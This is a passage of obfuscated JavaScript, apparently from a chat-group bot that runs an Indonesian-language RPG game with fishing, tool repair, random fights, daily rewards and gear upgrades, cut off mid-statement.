_0x1ed74f={'kepiting':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2d43)](Math['random'](),0x5)),'lobster':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x771)](Math[_0x240d04(0x24f1)](),0x5)),'udang':Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*0x5),'cumi':Math['floor'](_0x1ce978[_0x240d04(0x11b5)](Math[_0x240d04(0x24f1)](),0x5)),'gurita':Math['floor'](_0x1ce978[_0x240d04(0x1e0a)](Math[_0x240d04(0x24f1)](),0x5)),'buntal':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x368)](Math[_0x240d04(0x24f1)](),0x5)),'dory':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xe22)](Math[_0x240d04(0x24f1)](),0x5)),'orca':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2255)](Math[_0x240d04(0x24f1)](),0x5)),'lumba':Math['floor'](_0x1ce978[_0x240d04(0x11b5)](Math[_0x240d04(0x24f1)](),0x5)),'paus':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1a5)](Math[_0x240d04(0x24f1)](),0x5)),'hiu':Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xc30)](Math[_0x240d04(0x24f1)](),0x5))};for(let _0x34d57c in _0x1ed74f){_0x36eb6a[_0x34d57c]+=_0x1ed74f[_0x34d57c];}_0x36eb6a[_0x240d04(0x22db)]-=0x1,_0x36eb6a[_0x240d04(0x5bd)+_0x240d04(0x1ade)]-=0xa,_0x36eb6a['lastmisi']=_0x3090e4,await _0x961430(_0x33877d),global[_0x240d04(0xbe8)][_0xb65b97]=[_0x1ce978[_0x240d04(0x736)]],_0x1ce978[_0x240d04(0x29bf)](setTimeout,()=>delete global[_0x240d04(0xbe8)][_0xb65b97],0x4e20);const _0x441dbd=_0x1ce978[_0x240d04(0xcd)](_0x240d04(0x2494)+_0x240d04(0x1db3)+_0x240d04(0x1481),Object[_0x240d04(0x1121)](_0x1ed74f)[_0x240d04(0xfc3)](([_0x241237,_0x1fb98c])=>_0x1fb98c>0x0)[_0x240d04(0x16e6)](([_0x1c61cf,_0x18cb67])=>{const _0x4040f5=_0x240d04,_0x5a383f={'kepiting':'🦀','lobster':'🦞','udang':'🦐','cumi':'🦑','gurita':'🐙','buntal':'🐡','dory':'🐠','orca':'🐳','lumba':'🐬','paus':'🐋','hiu':'🦈'}[_0x1c61cf]||'';return _0x5a383f+'\x20'+_0x1ce978[_0x4040f5(0x1cf4)](_0x113048,_0x1c61cf)+':\x20'+_0x18cb67;})[_0x240d04(0x86e)]('\x0a'))||_0x1ce978[_0x240d04(0xc0f)];setTimeout(()=>_0x476bfb(_0x441dbd),0x4e20),_0x1ce978['IHuLF'](setTimeout,()=>_0x476bfb(_0x240d04(0x2325)+_0x240d04(0x16d0)+'kapanmu!'),0x4650),setTimeout(()=>_0x476bfb('🎣\x20Kamu\x20men'+_0x240d04(0x1f61)+_0x240d04(0x2534)+_0x240d04(0x1169)),0x3a98),setTimeout(()=>_0x476bfb(_0x240d04(0x2df)+'itarik\x20ika'+_0x240d04(0x2580)),0x2ee0),setTimeout(()=>_0x476bfb('🪱\x20Kamu\x20mel'+_0x240d04(0xc78)+'\x20ke\x20air...'),0x2328),_0x1ce978[_0x240d04(0x24e4)](setTimeout,()=>_0x476bfb(_0x240d04(0x160a)+_0x240d04(0x18fb)+'.'),0x0);function _0x113048(_0x38bcba){const _0xdc795d=_0x240d04;return _0x38bcba[_0xdc795d(0x211a)](0x0)[_0xdc795d(0xdd3)+'e']()+_0x38bcba[_0xdc795d(0x728)](0x1);}}catch(_0x1d3b11){if(_0x1ce978[_0x240d04(0x29a8)](_0x1ce978[_0x240d04(0x1fae)],_0x1ce978['MyLvB']))console['error'](_0x1d3b11),_0x1ce978['FSWOH'](_0x476bfb,_0x1ce978[_0x240d04(0x1e0e)]);else{const _0x398216=_0x7ce745[_0x40442c],_0x34a799=_0x398216[_0x240d04(0x2736)]||0x0,_0x59fa4a=_0x1ce978['xMUCV'](_0x5f4d82,_0x398216[_0x240d04(0x21ac)]);if(_0x1ce978[_0x240d04(0x27bb)](_0x59fa4a,_0x34a799)){const _0x9e4c5b=_0x59fa4a-_0x34a799;_0x398216[_0x240d04(0x2736)]=_0x59fa4a,_0x398216[_0x240d04(0xd24)]+=_0x1ce978[_0x240d04(0x1d56)](_0x9e4c5b,0x1f4),_0x1ce978[_0x240d04(0x1678)](_0x480dd6,_0x240d04(0x1367)+_0x240d04(0x2974)+_0x240d04(0xfdf)+_0x59fa4a+'!\x0aBonus:\x20+'+_0x1ce978['PjaZO'](_0x9e4c5b,0x1f4)+'\x20Money');}}}}break;case _0x1ce978[_0x240d04(0xa51)]:{const _0x5d76d6=(_0x483c03[0x0]||'')['toLowerCas'+'e']();try{if(_0x1ce978['lGZzB'](_0x1ce978[_0x240d04(0x2ac6)],_0x1ce978[_0x240d04(0xd61)])){const _0x317b2b=await _0x182219(),_0x4009d1=_0x317b2b[_0xb65b97]=_0x317b2b[_0xb65b97]||{};if(!_0x4009d1||!_0x4009d1[_0x240d04(0x2eea)]||!_0x4009d1[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x14d4)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x4009d1[_0x240d04(0x2344)])return _0x1ce978['kBPKG'](_0x476bfb,_0x1ce978[_0x240d04(0x17c4)]);const _0x1ede9f=[_0x1ce978[_0x240d04(0x2b4d)],'sword',_0x1ce978['xcUDY'],_0x240d04(0x1b8a)];for(let _0x4655ba of _0x1ede9f){_0x4009d1[_0x4655ba]=_0x4009d1[_0x4655ba]||0x0,_0x4009d1[_0x4655ba+_0x240d04(0x1ade)]=_0x4009d1[_0x4655ba+_0x240d04(0x1ade)]||0x64;}const _0x154bb9=()=>_0x476bfb(_0x240d04(0x26f1)+_0x240d04(0x19a3)+'\x20untuk\x20mem'+'perbaiki\x20*'+_0x5d76d6+'*!'),_0x1c6dd7=()=>_0x476bfb('❌\x20Kamu\x20bel'+_0x240d04(0x4c7)+_0x240d04(0x1658)+_0x5d76d6+(_0x240d04(0x2441)+_0x240d04(0x254e))),_0x3a2cf9=()=>_0x476bfb(_0x240d04(0x859)+_0x5d76d6+(_0x240d04(0x1bc4)+_0x240d04(0x638))),_0x5e811b={'pickaxe':{'rock':0x14,'wood':0x14,'iron':0x14,'diamond':0x1},'sword':{'wood':0x14,'iron':0x14,'gold':0x2,'diamond':0x1},'fishingrod':{'wood':0x14,'string':0x14,'iron':0x14,'diamond':0x1},'armor':{'iron':0xf,'gold':0x2,'diamond':0x1}};if(!_0x5d76d6||!_0x5e811b[_0x5d76d6]){if(_0x1ce978['VuLgn']===_0x1ce978['VuLgn']){const _0x2fc973=_0x240d04(0x2779)+'KI\x20PERALAT'+_0x240d04(0x158d)+_0x240d04(0x22c8)+_0x240d04(0x1b4e)+_0x240d04(0x1589)+'🎣\x0a•\x20Armor\x20'+_0x240d04(0x88a)+_0x240d04(0x2cf)+_0x240d04(0x2bdb)+_0x240d04(0x801)+_0x240d04(0x236)+_0x240d04(0x1c55);return _0x476bfb(_0x2fc973);}else _0x1363a5[_0x240d04(0x15e)](_0x1ce978[_0x240d04(0x1b74)],_0x206d95),_0x1ce978['MCfxG'](_0x23a257,_0x240d04(0x109e)+_0x240d04(0x2bf4)+_0x240d04(0x23d1)+_0x54ceb0['message']);}if(_0x1ce978[_0x240d04(0x29cc)](_0x4009d1[_0x5d76d6],0x0))return _0x1c6dd7();if(_0x4009d1[_0x5d76d6+_0x240d04(0x1ade)]>=0x64)return _0x1ce978[_0x240d04(0xd99)](_0x3a2cf9);const _0x569a7b=Object[_0x240d04(0x1121)](_0x5e811b[_0x5d76d6])[_0x240d04(0x2119)](([_0x2be37a,_0x5087bd])=>(_0x4009d1[_0x2be37a]||0x0)>=_0x5087bd);if(!_0x569a7b)return _0x1ce978[_0x240d04(0x726)](_0x154bb9);for(let [_0x3d5d5d,_0x54683f]of Object['entries'](_0x5e811b[_0x5d76d6])){_0x4009d1[_0x3d5d5d]-=_0x54683f;}return _0x4009d1[_0x5d76d6+'durability']=0x64,await _0x961430(_0x317b2b),_0x1ce978[_0x240d04(0x17e5)](_0x476bfb,_0x240d04(0x177b)+_0x5d76d6+(_0x240d04(0x23c3)+_0x240d04(0x1e8e)+_0x240d04(0x29f1)));}else return _0x443e22(_0x1ce978[_0x240d04(0x257a)]);}catch(_0x4cdc44){return console[_0x240d04(0x15e)](_0x4cdc44),_0x476bfb(_0x1ce978[_0x240d04(0x18fc)]);}}break;case _0x1ce978[_0x240d04(0x1884)]:case _0x240d04(0x2b09):{const _0x1a94d2=_0x29eedc=>new Promise(_0x398708=>setTimeout(_0x398708,_0x29eedc)),_0x1d0a9c=(_0x345c30,_0x318d8e)=>Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*(_0x318d8e-_0x345c30+0x1))+_0x345c30,_0x312aa7=[_0x240d04(0x2888)+_0x240d04(0xcac),_0x240d04(0x1b94)+'tegi\x20cerda'+'s','terlalu\x20OP',_0x1ce978['GGwKM'],_0x1ce978[_0x240d04(0x2c2b)]],_0x3d298b=[_0x1ce978[_0x240d04(0x1cbf)],_0x1ce978['AmDat'],_0x1ce978['mjHfq'],_0x1ce978['NvVru'],_0x1ce978['lPzQB']];try{if(_0x1ce978[_0x240d04(0x6d9)](_0x1ce978[_0x240d04(0x23da)],_0x1ce978[_0x240d04(0x23da)]))_0x1ce978['zSDJE'](_0x5166df,_0x240d04(0x15fe)+_0x240d04(0xe70)+_0x526b3a[_0x240d04(0x960)][_0x240d04(0x24b)]['id']);else{const _0x9bb60f=await _0x1ce978[_0x240d04(0x2b58)](_0x182219),_0x2ff825=_0x9bb60f[_0xb65b97]=_0x9bb60f[_0xb65b97]||{'level':0x1,'money':0x0,'limit':0x0};if(!_0x2ff825||!_0x2ff825[_0x240d04(0x2eea)]||!_0x2ff825[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x2c2c)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);global['fight']=global[_0x240d04(0x1180)]||{};if(global[_0x240d04(0x1180)][_0xb65b97])return _0x1ce978[_0x240d04(0x250e)](_0x476bfb,_0x1ce978[_0x240d04(0x1a10)]);const _0x200435=((()=>{const _0x5f2d43=_0x240d04,_0x2eadbd=participants[_0x5f2d43(0x16e6)](_0xbc565=>_0xbc565['id'])[_0x5f2d43(0xfc3)](_0xb6a946=>_0xb6a946!==_0xb65b97&&_0x9bb60f[_0xb6a946]&&_0x9bb60f[_0xb6a946][_0x5f2d43(0x2736)]);return _0x2eadbd[_0x1ce978[_0x5f2d43(0x130c)](_0x1d0a9c,0x0,_0x2eadbd['length']-0x1)];})());if(!_0x200435)return _0x1ce978[_0x240d04(0x26f5)](_0x476bfb,_0x240d04(0x2de1)+_0x240d04(0x657)+_0x240d04(0x2c06)+'ajak\x20berta'+_0x240d04(0xac1));const _0x5ce4f7=_0x9bb60f[_0x200435],_0x3dc7af=await _0x1ce978['fMKGn'](_0x4d0f7a,_0x200435),_0x2f7953=await _0x4d0f7a(_0xb65b97);_0x1ce978[_0x240d04(0x2273)](_0x476bfb,_0x240d04(0x241a)+_0x2f7953+_0x240d04(0x4f3)+_0x2ff825[_0x240d04(0x2736)]+(_0x240d04(0x1b2a)+_0x240d04(0x2eac))+_0x3dc7af+_0x240d04(0x4f3)+_0x5ce4f7[_0x240d04(0x2736)]+(_0x240d04(0x16a4)+_0x240d04(0x1f12)+_0x240d04(0x1e41)+'hat\x20siapa\x20'+'yang\x20menan'+_0x240d04(0x106d))),global[_0x240d04(0x1180)][_0xb65b97]=!![],await _0x1ce978[_0x240d04(0x1981)](_0x1a94d2,0x493e0);const _0x55c4da=[];for(let _0x109177=0x0;_0x1ce978[_0x240d04(0x6e0)](_0x109177,_0x2ff825[_0x240d04(0x2736)]);_0x109177++)_0x55c4da[_0x240d04(0x7dc)](_0xb65b97);for(let _0x1f85d9=0x0;_0x1f85d9<_0x5ce4f7['level'];_0x1f85d9++)_0x55c4da[_0x240d04(0x7dc)](_0x200435);let _0x3d568e=0x0,_0x5d1264=0x0;for(let _0x4c2075=0x0;_0x4c2075<0xa;_0x4c2075++){if(_0x1ce978[_0x240d04(0x2516)](_0x1ce978[_0x240d04(0x29e8)],_0x1ce978[_0x240d04(0x13a0)])){if(_0x55c4da[_0x1ce978[_0x240d04(0x2dbf)](_0x1d0a9c,0x0,_0x1ce978['HPZGb'](_0x55c4da['length'],0x1))]===_0xb65b97)_0x3d568e++;else _0x5d1264++;}else _0x1ce978['nWGYZ'](_0x268700,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x19e)](_0x4f2377,_0x345616)+'*'),delete _0x4d0e21[_0x1296d9];}if(_0x1ce978['BAgvs'](_0x3d568e,_0x5d1264)){if(_0x1ce978['kmsSZ']!==_0x240d04(0x121)){const _0x58479a=_0x1ce978[_0x240d04(0x221b)](_0x1ce978[_0x240d04(0x19b0)](_0x3d568e,_0x5d1264),0x2710);_0x2ff825[_0x240d04(0xd24)]+=_0x58479a,_0x2ff825[_0x240d04(0xc80)]+=0x1,_0x1ce978[_0x240d04(0x2289)](_0x476bfb,_0x240d04(0x177b)+_0x2f7953+_0x240d04(0x6e5)+_0x1ce978['ICMYO'](_0x3d568e,0xa)+_0x240d04(0x1ca8)+_0x1ce978[_0x240d04(0x1f51)](_0x5d1264,0xa)+_0x240d04(0xdbb)+_0x3dc7af+(_0x240d04(0x2b50)+'enang!*\x20ka'+_0x240d04(0x2410))+_0x312aa7[_0x1ce978['Rsvji'](_0x1d0a9c,0x0,_0x1ce978[_0x240d04(0x1ec3)](_0x312aa7[_0x240d04(0x2b45)],0x1))]+_0x240d04(0x2bd6)+_0x58479a[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+(_0x240d04(0x670)+'t'));}else _0x1ce978[_0x240d04(0x133c)](_0x542fe8,_0x450541,_0xcf03c2[_0x240d04(0x2b45)],_0x240d04(0x2117));}else{if(_0x1ce978[_0x240d04(0x13ac)](_0x3d568e,_0x5d1264)){const _0x1a8ca2=_0x1ce978['nsDBh'](_0x5d1264-_0x3d568e,0x186a0);_0x2ff825[_0x240d04(0xd24)]=Math[_0x240d04(0x1c2f)](0x0,_0x2ff825['money']-_0x1a8ca2),_0x2ff825[_0x240d04(0xc80)]+=0x1,_0x1ce978[_0x240d04(0x187d)](_0x476bfb,_0x240d04(0x22f4)+_0x2f7953+_0x240d04(0x6e5)+_0x3d568e*0xa+_0x240d04(0x1ca8)+_0x5d1264*0xa+']\x20*'+_0x3dc7af+('*\x0a\x0a*Kamu\x20k'+_0x240d04(0x1f0b)+_0x240d04(0x2360))+_0x3d298b[_0x1ce978['eaUYL'](_0x1d0a9c,0x0,_0x1ce978[_0x240d04(0x1fac)](_0x3d298b[_0x240d04(0x2b45)],0x1))]+_0x240d04(0x11ff)+_0x1a8ca2['toLocaleSt'+'ring']()+(_0x240d04(0x26dc)+'t'));}else _0x1ce978[_0x240d04(0x6b1)](_0x476bfb,'🤝\x20*'+_0x2f7953+_0x240d04(0x6e5)+_0x1ce978[_0x240d04(0x21c3)](_0x3d568e,0xa)+_0x240d04(0x1ca8)+_0x5d1264*0xa+_0x240d04(0xdbb)+_0x3dc7af+(_0x240d04(0x2a37)+_0x240d04(0x10b2)+_0x240d04(0x162a)+_0x240d04(0x1e81)+_0x240d04(0x2ef4)+'h.'));}delete global[_0x240d04(0x1180)][_0xb65b97],await _0x1ce978[_0x240d04(0xbe7)](_0x961430,_0x9bb60f);}}catch(_0x37cf32){console[_0x240d04(0x15e)](_0x37cf32),_0x1ce978['VuSqI'](_0x476bfb,_0x240d04(0x54a)+'salahan\x20sa'+'at\x20menjala'+_0x240d04(0x1daa)+_0x240d04(0x2ed9));}async function _0x4d0f7a(_0x53ddb0){const _0x520498=_0x240d04,_0x3fd305=participants['find'](_0x5240df=>_0x5240df['id']===_0x53ddb0);return _0x3fd305?.[_0x520498(0x8f0)]||_0x53ddb0[_0x520498(0x1c39)]('@')[0x0];}}break;case _0x1ce978[_0x240d04(0x1d22)]:{if(_0x1ce978['AVMGc'](_0x1ce978[_0x240d04(0x1b29)],_0x1ce978['SpwnH'])){const _0x2005ae=0x2932e0,_0x3fa602=_0x485124=>{const _0x1f093d=_0x240d04;if(_0x1ce978['uvaop'](_0x1f093d(0xb8d),'kIinL')){let _0x52a279=Math[_0x1f093d(0xf02)](_0x1ce978[_0x1f093d(0x2999)](_0x485124,0x36ee80)),_0x1969d1=_0x1ce978[_0x1f093d(0xf46)](Math[_0x1f093d(0xf02)](_0x485124/0xea60),0x3c),_0x46cdf2=_0x1ce978[_0x1f093d(0x252)](Math['floor'](_0x1ce978[_0x1f093d(0x192c)](_0x485124,0x3e8)),0x3c);return _0x1969d1+_0x1f093d(0x1e9d)+_0x46cdf2+_0x1f093d(0xeac);}else return _0x166f76(_0x1ce978[_0x1f093d(0x257a)]);};try{if(_0x1ce978[_0x240d04(0x1b4)](_0x1ce978[_0x240d04(0x1b16)],_0x1ce978[_0x240d04(0x144d)]))return _0x1ce978[_0x240d04(0x1cf3)](_0x1b87fe,_0x1ce978[_0x240d04(0x24a8)]);else{const _0x491627=await _0x1ce978[_0x240d04(0x22fc)](_0x182219),_0x41d2df=_0x491627[_0xb65b97]=_0x491627[_0xb65b97]||{'money':0x0,'exp':0x0,'lastclaim':0x0};if(!_0x41d2df||!_0x41d2df[_0x240d04(0x2eea)]||!_0x41d2df[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(_0x41d2df[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x18e3)](_0x476bfb,_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x2b5c)+_0x240d04(0x2826)+_0x240d04(0x1fbc)+_0x240d04(0x1310)+_0x240d04(0x260)+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+'keluar\x20dar'+'i\x20penjara.');const _0xf895c3=Date[_0x240d04(0x104e)](),_0x2fd422=_0x1ce978['HPZGb'](_0x1ce978[_0x240d04(0x2323)](_0x41d2df[_0x240d04(0x1475)],_0x2005ae),_0xf895c3);if(_0x1ce978[_0x240d04(0xb42)](_0x2fd422,0x0))return _0x476bfb(_0x240d04(0x23ff)+_0x240d04(0x1999)+_0x240d04(0xa76)+'unggu\x20'+_0x1ce978['pdjVk'](_0x3fa602,_0x2fd422)+(_0x240d04(0x19c0)+_0x240d04(0x1610)+_0x240d04(0x100e)));_0x41d2df['money']+=0xc350,_0x41d2df[_0x240d04(0x21ac)]+=0x64,_0x41d2df['lastclaim']=_0xf895c3,await _0x1ce978[_0x240d04(0x4ca)](_0x961430,_0x491627),_0x1ce978[_0x240d04(0x1f3)](_0x476bfb,_0x240d04(0x1f38)+_0x240d04(0x424)+_0x240d04(0xdc0)+_0x240d04(0x2af7));}}catch(_0x454e36){if(_0x1ce978[_0x240d04(0x2275)](_0x1ce978[_0x240d04(0x251f)],_0x1ce978[_0x240d04(0xc8)]))console[_0x240d04(0x15e)](_0x454e36),_0x1ce978[_0x240d04(0x682)](_0x476bfb,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x22c2)+_0x240d04(0x25fa));else return _0x1ce978['FUtVU'](_0x43605a,_0x1ce978[_0x240d04(0x1453)]);}}else _0x1ce978[_0x240d04(0x1ba)](_0x25b74d,_0x226d8f,_0xc22c2d[_0x240d04(0x2b45)],_0x1ce978['OjOeG']);}break;case _0x240d04(0x7f3):{try{const _0x7a93b=await _0x182219(),_0xddd6f6=_0x7a93b[_0xb65b97]=_0x7a93b[_0xb65b97]||{};if(!_0xddd6f6||!_0xddd6f6[_0x240d04(0x2eea)]||!_0xddd6f6[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0x6d9)](_0x240d04(0x1bc5),_0x240d04(0x1bc5))){const _0x1500e2=_0x1fbed5[0x0];if(/^\d+$/[_0x240d04(0x1dc7)](_0x1500e2))_0x2dd3b9=_0x1ce978[_0x240d04(0x14d0)](_0x41d8ab,_0x1500e2);else{if(_0x1500e2[_0x240d04(0xed0)]('@'))_0x18a3d1=_0x1500e2[_0x240d04(0x728)](0x1);else return _0x1ce978[_0x240d04(0xa62)](_0x52c8a3,_0x1ce978[_0x240d04(0x2801)]);}}else return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);}const _0x25a77b=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x1155af=('\x0aGunakan\x20F'+_0x240d04(0x1edd)+_0x3e6565+('\x20[type]*\x0aC'+_0x240d04(0xa03))+_0x3e6565+('\x20pickaxe*\x0a'+_0x240d04(0x1b7e)+_0x240d04(0xbc9)+_0x240d04(0x227))+_0x246ab0[_0x240d04(0x1fc7)](_0x1ce978[_0x240d04(0x25f6)])+(_0x240d04(0x19dc)+'d\x0a')+_0x246ab0[_0x240d04(0x1fc7)](_0x240d04(0x206b))+'\x20Pickaxe\x0a'+_0x246ab0[_0x240d04(0x1fc7)](_0x1ce978[_0x240d04(0x2ea3)])+'\x20Sword\x0a'+_0x246ab0['emoticon'](_0x1ce978[_0x240d04(0x28bb)])+'\x20Armor\x0a'+_0x246ab0[_0x240d04(0x1fc7)](_0x240d04(0x1e39))+_0x240d04(0x1c12))['trim']();if(!_0x25a77b)return _0x1ce978[_0x240d04(0x297c)](_0x476bfb,_0x1155af);const _0x4d09a0={'fishingrod':{'level':_0x1ce978[_0x240d04(0x25f6)],'durability':_0x1ce978[_0x240d04(0xe73)],'bahan':_0x4bd997=>({'wood':_0x4bd997*0x64,'string':_0x4bd997*0x64,'money':_0x4bd997*0xf4240}),'max':0xa},'pickaxe':{'level':_0x1ce978[_0x240d04(0x2b4d)],'durability':_0x1ce978[_0x240d04(0xc2f)],'bahan':_0x3554f2=>({'rock':_0x3554f2*0xfa,'wood':_0x3554f2*0x96,'money':_0x3554f2*0x16e360}),'max':0xa},'sword':{'level':_0x240d04(0x9f8),'durability':_0x1ce978[_0x240d04(0x1330)],'bahan':_0x4b0f8c=>({'iron':_0x4b0f8c*0xfa,'wood':_0x4b0f8c*0x96,'money':_0x4b0f8c*0xf4240}),'max':0xa},'armor':{'level':_0x1ce978[_0x240d04(0x28bb)],'durability':_0x1ce978['NAUvR'],'bahan':_0x2f8211=>({'diamond':_0x2f8211*0x5,'wood':_0x2f8211*0x96,'money':_0x2f8211*0xf4240}),'max':0xa},'atm':{'level':_0x240d04(0x1e39),'durability':_0x1ce978[_0x240d04(0x1de2)],'bahan':_0x245eac=>({'diamond':_0x245eac*0x3,'emerald':_0x245eac*0x5,'money':_0x245eac*0x2710}),'max':0x3e8,'scale':_0x121a18=>_0x121a18*0x1dcd6500}};if(!_0x4d09a0[_0x25a77b])return _0x1ce978[_0x240d04(0x290e)](_0x476bfb,_0x1155af);const _0x3e3069=_0x4d09a0[_0x25a77b];_0xddd6f6[_0x3e3069[_0x240d04(0x2736)]]=_0xddd6f6[_0x3e3069[_0x240d04(0x2736)]]||0x0,_0xddd6f6[_0x3e3069[_0x240d04(0x1ade)]]=_0xddd6f6[_0x3e3069[_0x240d04(0x1ade)]]||0x0;if(_0x1ce978['sDzql'](_0xddd6f6[_0x3e3069['level']],0x0)){if(_0x1ce978[_0x240d04(0x2012)](_0x1ce978[_0x240d04(0x2723)],_0x1ce978['sNelF'])){const _0x404012=_0x4a3ad[_0x240d04(0x2113)+'nc'](_0x409a76,_0x1ce978[_0x240d04(0x8b9)]);return _0xa8d026[_0x240d04(0x1c34)](_0x404012);}else return _0x476bfb(_0x240d04(0x4cc)+'um\x20memilik'+_0x240d04(0x1658)+_0x246ab0[_0x240d04(0x1fc7)](_0x25a77b)+'\x20'+_0x11d76d(_0x25a77b)+('*.\x0aGunakan'+'\x20*')+_0x1ec495+_0x240d04(0xc8a)+_0x25a77b+(_0x240d04(0x2ba8)+_0x240d04(0x1452)));}if(_0x1ce978[_0x240d04(0x1097)](_0xddd6f6[_0x3e3069['level']],_0x3e3069[_0x240d04(0x1c2f)]))return _0x1ce978[_0x240d04(0x1f8b)](_0x476bfb,_0x240d04(0x177b)+_0x1ce978[_0x240d04(0xddc)](_0x11d76d,_0x25a77b)+(_0x240d04(0xaff)+_0x240d04(0xcdc)+_0x240d04(0x250a)+_0x240d04(0x659)));const _0x50c6bf=_0x3e3069[_0x240d04(0xefd)](_0xddd6f6[_0x3e3069[_0x240d04(0x2736)]]),_0xc3b9fb=Object[_0x240d04(0x1121)](_0x50c6bf)[_0x240d04(0xfc3)](([_0x14cece,_0x1aa7fd])=>(_0xddd6f6[_0x14cece]||0x0)<_0x1aa7fd);if(_0x1ce978[_0x240d04(0xff1)](_0xc3b9fb['length'],0x0)){if('nidnO'===_0x240d04(0x520)){let _0x4b51ec=_0x1ce978[_0x240d04(0x16c3)]+_0xc3b9fb[_0x240d04(0x16e6)](([_0x85c866,_0x5af701])=>_0x246ab0[_0x240d04(0x1fc7)](_0x85c866)+'\x20*'+_0x11d76d(_0x85c866)+_0x240d04(0x22de)+(_0x5af701-_0xddd6f6[_0x85c866]))[_0x240d04(0x86e)]('\x0a');return _0x1ce978[_0x240d04(0x548)](_0x476bfb,_0x4b51ec);}else _0x1ce978[_0x240d04(0xdd7)](_0x19d3a9,_0x1ce978[_0x240d04(0x2bdd)](_0x1ce978[_0x240d04(0x17cf)],_0x9d23f5));}for(let [_0x1ecf9b,_0x1bbb26]of Object[_0x240d04(0x1121)](_0x50c6bf)){_0xddd6f6[_0x1ecf9b]-=_0x1bbb26;}_0xddd6f6[_0x3e3069['level']]+=0x1;_0x1ce978[_0x240d04(0x2195)](_0x25a77b,'atm')?_0xddd6f6[_0x3e3069[_0x240d04(0x1ade)]]=_0x3e3069['scale'](_0xddd6f6[_0x3e3069['level']]):_0x1ce978[_0x240d04(0xb6d)](_0x1ce978[_0x240d04(0x1e11)],_0x1ce978[_0x240d04(0x1e11)])?_0xddd6f6[_0x3e3069['durability']]=_0x1ce978[_0x240d04(0x2d43)](_0xddd6f6[_0x3e3069[_0x240d04(0x2736)]],0x32):_0x1ce978[_0x240d04(0x8bd)](_0x2f7dbc,_0x58f561,_0x47661e[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);await _0x1ce978[_0x240d04(0x1897)](_0x961430,_0x7a93b),_0x1ce978[_0x240d04(0x26bc)](_0x476bfb,_0x240d04(0x1b57)+'*'+_0x246ab0['emoticon'](_0x25a77b)+'\x20'+_0x1ce978[_0x240d04(0x170d)](_0x11d76d,_0x25a77b)+(_0x240d04(0x23c3)+_0x240d04(0x50e))+_0xddd6f6[_0x3e3069[_0x240d04(0x2736)]]);function _0x11d76d(_0x22be8e){const _0x3a45c7=_0x240d04;return _0x1ce978[_0x3a45c7(0x6be)](_0x22be8e[_0x3a45c7(0x211a)](0x0)[_0x3a45c7(0xdd3)+'e'](),_0x22be8e['slice'](0x1));}}catch(_0x4ab746){console['error'](_0x4ab746),_0x1ce978['PAxCS'](_0x476bfb,_0x1ce978['oHLuy']);}}break;case _0x1ce978['ohqNX']:{const _0x155155=_0x2ffa1d=>!isNaN(_0x2ffa1d),_0x268309=_0x580ed4=>[_0x240d04(0xb5a),'uncommon',_0x240d04(0xac4),_0x240d04(0x292e),_0x240d04(0x14f7)][_0x240d04(0x55c)](_0x580ed4)?'\x20Crate':'',_0x15a4c6=await _0x1ce978[_0x240d04(0x12cc)](_0x182219),_0x54f7a9=_0x15a4c6[_0xb65b97]=_0x15a4c6[_0xb65b97]||{};if(!_0x54f7a9||!_0x54f7a9['nama']||!_0x54f7a9[_0x240d04(0x634)]){if(_0x1ce978[_0x240d04(0x1bd)](_0x1ce978[_0x240d04(0x1e1e)],_0x1ce978['fSnTS']))return _0x1ce978[_0x240d04(0x27c5)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);else _0x1ce978[_0x240d04(0xa70)](_0x3ab874,_0x585464,_0xa28129['length'],_0x1ce978['jZgVp']);}const _0x37d0cf=(_0x483c03[0x0]||'')[_0x240d04(0x25f7)+'e'](),_0x5da94e=parseInt(_0x483c03[0x1]),_0x572f0f=[_0x1ce978[_0x240d04(0x5bb)],_0x1ce978[_0x240d04(0x12f4)],_0x1ce978[_0x240d04(0x194d)],_0x1ce978[_0x240d04(0x1cff)],_0x240d04(0x132c),_0x240d04(0x2dc8),_0x1ce978[_0x240d04(0x13a2)],_0x240d04(0x14f7),_0x1ce978[_0x240d04(0x1b3c)],_0x1ce978['XXJra'],_0x1ce978[_0x240d04(0x11c4)],_0x1ce978['NTxdE'],_0x1ce978[_0x240d04(0x330)],_0x1ce978[_0x240d04(0xb64)],_0x1ce978[_0x240d04(0xc8c)],_0x1ce978[_0x240d04(0x2bac)],'legendary',_0x1ce978[_0x240d04(0x1303)],'anggur',_0x1ce978['fexHL'],_0x240d04(0x196b),'mangga',_0x240d04(0x1a7c),_0x1ce978[_0x240d04(0x2d75)],_0x1ce978['cPTQz'],_0x1ce978[_0x240d04(0x1964)],_0x1ce978[_0x240d04(0xf25)],_0x1ce978['RsMgM']],_0x3a8036=_0x572f0f['filter'](_0x15cf8f=>_0x15cf8f in _0x54f7a9&&typeof _0x54f7a9[_0x15cf8f]==_0x240d04(0x19b5));if(!_0x3a8036[_0x240d04(0x55c)](_0x37d0cf)){const _0x1e92e6=_0x3a8036[_0x240d04(0x16e6)](_0x19322b=>_0x246ab0['emoticon'](_0x19322b)+'\x20'+_0x19322b)[_0x240d04(0x86e)]('\x0a');return 